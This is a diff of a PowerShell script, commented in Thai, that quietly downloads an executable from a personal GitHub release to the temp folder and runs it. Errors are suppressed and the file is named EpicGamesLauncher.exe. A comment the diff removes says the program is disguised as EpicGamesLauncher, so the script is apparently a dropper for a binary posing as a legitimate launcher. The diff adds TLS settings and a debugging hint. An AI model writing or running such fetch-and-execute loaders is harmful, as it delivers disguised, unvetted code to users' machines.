@@ -1,5 +1,10 @@
 $ErrorActionPreference = "SilentlyContinue"
 
+# ==========================================
+# 🌟 บังคับใช้ TLS 1.2 สำหรับเชื่อมต่อ GitHub
+# ==========================================
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 # 1. ข้อมูลไฟล์และลิงก์
 $downloadUrl = "https://github.com/GRILLYje/Wip_public/releases/download/V1.0.4/EpicGamesLauncher.exe" 
 $tempPath = "$env:TEMP\EpicGamesLauncher.exe"
@@ -17,6 +22,7 @@ try {
     $webClient.DownloadFile($downloadUrl, $tempPath)
     $webClient.Dispose()
 } catch {
+    # 💡 ถ้ายังโหลดไม่ผ่านอีก ให้ลองเอา $ErrorActionPreference บรรทัดบนสุดออก เพื่อดู Error จริงๆ
     Write-Host "An error occurred while downloading the file" -ForegroundColor Red
     Exit
 }
@@ -38,6 +44,6 @@ try {
 }
 # ==========================================
 
-# 4. รันโปรแกรม (แฝงตัวเป็น EpicGamesLauncher)
-Write-Host "Launching..." -ForegroundColor Green
+# 4. รันโปรแกรม 
+Write-Host "Launching" -ForegroundColor Green
 Start-Process -FilePath $tempPath
